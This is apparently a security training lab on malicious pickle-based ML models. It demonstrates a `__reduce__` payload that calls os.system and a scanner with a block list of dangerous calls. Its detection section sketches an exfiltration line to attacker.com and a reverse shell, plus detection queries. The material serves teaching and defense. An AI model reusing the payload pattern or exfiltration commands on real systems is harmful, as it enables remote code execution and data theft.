Machine learning models are software artifacts. They are downloaded from registries like HuggingFace Hub, shared on model zoos, and loaded into production systems. But unlike Docker images or npm packages, models have a unique property: the dominant serialization format (Python's pickle) **executes arbitrary code on load**.

When you call `torch.load("model.pt")`, Python's pickle protocol deserializes the file by reconstructing objects -- including calling `__reduce__` methods that can run any Python code. An attacker who publishes a malicious model to HuggingFace Hub, or compromises a model in a shared filesystem, gets code execution on every machine that loads it.

In this lab, you will download a model from a simulated HuggingFace registry, experience the attack, and then implement safe model loading.

### Step 2: Understand pickle serialization

```bash
python3 << 'PYEOF'
import pickle, pickletools, io

# A simple Python object, pickled
data = {"weights": [1.0, 2.0, 3.0], "bias": 0.5}
serialized = pickle.dumps(data)

print("=== Pickle opcodes for a safe object ===")
pickletools.dis(serialized)
PYEOF
```

Pickle reconstructs Python objects from a bytecode stream. The `REDUCE` opcode calls arbitrary functions. This is by design -- pickle is meant to serialize ANY Python object, including those with custom reconstruction logic.

### Step 3: Understand the attack surface

```bash
python3 << 'PYEOF'
import pickle, pickletools, io

# A MALICIOUS pickle payload
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ("echo PWNED > /tmp/ml-model-pwned",))

serialized = pickle.dumps(Exploit())

print("=== Pickle opcodes for a malicious object ===")
pickletools.dis(serialized)
print("\nNotice the REDUCE opcode calling os.system")
PYEOF
```

The `__reduce__` method tells pickle HOW to reconstruct the object. An attacker sets it to call `os.system()`, `subprocess.run()`, `exec()`, or any other callable. **This executes during deserialization, before you ever inspect the object.**

### Step 5: Understand the real-world impact

In the real world, a malicious model loaded in production could:

- **Exfiltrate training data** -- steal proprietary datasets
- **Backdoor the model** -- modify weights to produce attacker-chosen outputs for specific inputs
- **Pivot to infrastructure** -- steal cloud credentials from environment variables
- **Establish persistence** -- install a reverse shell or cron job
- **Mine cryptocurrency** -- use GPU resources for mining

HuggingFace Hub alone hosts over 500,000 models. Many are loaded with `torch.load()` by default.

### Fix 2: Create a safe model loader

```bash
cat > /app/safe_loader.py << 'PYEOF'
"""
Safe model loader that uses safetensors instead of pickle.
Safetensors stores ONLY tensor data -- no executable code, no Python objects.
"""
from safetensors.torch import load_file

def load_model(path: str) -> dict:
    """Load a model safely using safetensors format."""
    if not path.endswith(".safetensors"):
        raise ValueError(
            f"Refusing to load {path}: only .safetensors format is allowed. "
            f"Convert pickle models with: safetensors convert <file>"
        )
    return load_file(path)

if __name__ == "__main__":
    import sys
    path = sys.argv[1] if len(sys.argv) > 1 else "/app/models/model.safetensors"
    weights = load_model(path)
    print(f"Loaded model from {path}")
    print(f"Keys: {list(weights.keys())}")
    for k, v in weights.items():
        print(f"  {k}: shape={v.shape}, dtype={v.dtype}")
PYEOF
```

### Fix 3: Create a model scanning tool

```bash
cat > /app/scan_model.py << 'PYEOF'
"""
Scan pickle-based model files for suspicious opcodes before loading.
This is a defense-in-depth measure for when safetensors is not available.
"""
import pickletools
import sys
import re

DANGEROUS_CALLS = [
    "os.system", "os.popen", "subprocess", "exec", "eval",
    "builtins.exec", "builtins.eval", "importlib", "nt.system",
    "posix.system", "__import__", "commands.getoutput",
    "shutil.rmtree", "webbrowser.open"
]

def scan_model(filepath: str) -> list:
    """Scan a pickle file for dangerous opcodes."""
    findings = []
    try:
        with open(filepath, "rb") as f:
            content = f.read()

        # Check for dangerous function names in the binary
        for call in DANGEROUS_CALLS:
            if call.encode() in content:
                findings.append(f"CRITICAL: Found reference to '{call}' in pickle stream")

        # Try to disassemble and look for REDUCE/INST opcodes
        try:
            ops = pickletools.genops(content)
            for opcode, arg, pos in ops:
                if opcode.name in ("REDUCE", "INST", "OBJ", "NEWOBJ"):
                    findings.append(
                        f"WARNING: {opcode.name} opcode at position {pos} "
                        f"(executes code during deserialization)"
                    )
        except Exception:
            findings.append("WARNING: Could not parse pickle opcodes (may be nested/compressed)")

    except Exception as e:
        findings.append(f"ERROR: Could not scan file: {e}")

    return findings

if __name__ == "__main__":
    filepath = sys.argv[1] if len(sys.argv) > 1 else "/app/models/malicious_model.pt"
    print(f"Scanning {filepath}...")
    findings = scan_model(filepath)
    if findings:
        print(f"\n{'='*60}")
        print(f"SCAN RESULTS: {len(findings)} finding(s)")
        print(f"{'='*60}")
        for f in findings:
            print(f"  {f}")
        print(f"\nDO NOT LOAD THIS MODEL with torch.load() or pickle.load()")
    else:
        print("No suspicious patterns found (but safetensors is still preferred)")
PYEOF
```

### Additional defenses (discussion)

1. **PyTorch `weights_only=True`**: Since PyTorch 2.0, `torch.load(..., weights_only=True)` restricts deserialization to tensor types only. This blocks most attacks but is not as robust as safetensors.

2. **Model provenance**: HuggingFace Hub now supports model signing and provenance attestation. Verify the model was uploaded by the expected author.

3. **Model cards**: Check the model card for the expected architecture, training data, and performance metrics. A model that claims to be a sentiment classifier but has unusual file sizes or architectures is suspicious.

4. **Sandboxed loading**: If you must load pickle models, do so in a sandboxed environment (container, VM, gVisor) with no network access and limited filesystem access.

!!! danger "Phase 4: DETECT -- Catching Malicious Model Loading"

    **Goal:** Detect malicious model loading attempts using SIEM, EDR, and file integrity monitoring.

### SIEM / Log Indicators

ML model loading attacks are difficult to detect because `torch.load()` is a legitimate operation. The key signals are **unexpected process spawning from Python model loading** and **network activity during model deserialization**.

**What to look for:**

- Python processes spawning child processes (shell, curl, wget) during model loading
- File writes to `/tmp/` or other world-writable directories during `torch.load()`
- Outbound network connections from ML inference containers/servers
- Models downloaded from untrusted sources (not your model registry)
- Models with unusually large file sizes for their architecture type

### Network Indicators

| Indicator | Phase | What It Means |
|-----------|-------|---------------|
| HTTP GET to unknown model registries | Download | Model loaded from untrusted source |
| Outbound connection from inference pod | Execution | Malicious pickle payload phoning home |
| DNS query to unusual domain from ML workload | Exfil | Model exfiltrating data via DNS |

**Suricata rule -- detect unexpected outbound connections from ML workloads:**

```yaml
alert http $ML_SERVERS any -> $EXTERNAL_NET any (
  msg:"WEAKLINK - Unexpected outbound HTTP from ML inference workload";
  flow:established,to_server;
  content:"python"; http.user_agent;
  classtype:trojan-activity;
  sid:2100010; rev:1;
)
```

### EDR / Process Indicators

**Process tree of a malicious model load:**

```
python3 inference_server.py
 └── torch.load("model.pt")
      └── pickle.loads(...)
           ├── os.system("curl https://attacker.com/exfil?...")    ← exfiltration
           ├── exec("import socket; ...")                          ← reverse shell
           └── open("/tmp/ml-model-pwned", "w").write("pwned")    ← marker
```

### Example Detection Queries

**Splunk -- detect process spawning from torch.load:**

```spl
index=edr sourcetype=crowdstrike:events
  parent_process_name="python*"
  process_command_line="*torch.load*" OR parent_process_command_line="*model*.pt*"
| where process_name IN ("curl", "wget", "sh", "bash", "nc")
| table _time, host, parent_process_command_line, process_name, process_command_line
```

**KQL (Microsoft Sentinel) -- file writes during model loading:**

```kql
DeviceFileEvents
| where InitiatingProcessFileName has "python"
| where InitiatingProcessCommandLine has_any ("torch.load", "pickle.load", ".pt", ".pkl")
| where FolderPath startswith "/tmp/" or FolderPath startswith "/var/tmp/"
| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine
```

!!! tip "SOC Relevance"

    **Alerts you will see:**

    - "Unexpected child process from Python ML workload" (EDR)
    - "Outbound HTTP/DNS from inference container" (firewall/proxy)
    - "File creation in /tmp during model deserialization" (FIM)

    **Why this matters to your SOC:** ML model supply chain attacks are increasingly common as organizations adopt AI. HuggingFace Hub hosts 500,000+ models, many with pickle-based formats. Unlike npm or PyPI attacks, ML model attacks execute code on high-value GPU infrastructure that often has access to sensitive training data and cloud credentials.

    **Triage workflow:**

    1. **Check the model source** -- was it downloaded from your approved model registry, or from a public/untrusted source?
    2. **Check the format** -- `.pt`, `.pkl`, `.bin` files use pickle and can execute code. `.safetensors` files are safe.
    3. **Check the process tree** -- did the Python process spawn unexpected children during model loading?
    4. **Check for exfiltration** -- look for outbound connections to unfamiliar hosts from ML workloads.
    5. **Scope the blast radius** -- if the model was loaded in production, assume all data accessible to that workload is compromised.

    **False positive rate:** Medium. Legitimate ML pipelines do spawn subprocesses (data preprocessing, GPU management), but they should not make outbound network calls or write to `/tmp` during `torch.load()`.

## What You Learned

1. **ML models are code** -- pickle-based formats (`torch.load()`) execute arbitrary Python during deserialization, making every model download a potential code execution vector.
2. **safetensors eliminates the risk** -- the format stores only tensor numerical data with no executable code, making it immune to deserialization attacks.
3. **Model registries are the new package registries** -- HuggingFace Hub, model zoos, and shared filesystems are attack surfaces that need the same scrutiny as PyPI or npm.
4. **Scanning is defense-in-depth** -- tools like `fickling` and custom pickle opcode scanners catch known patterns, but safetensors is the only complete solution.
5. **PyTorch `weights_only=True`** is a step forward but not as robust as safetensors -- prefer full format migration.
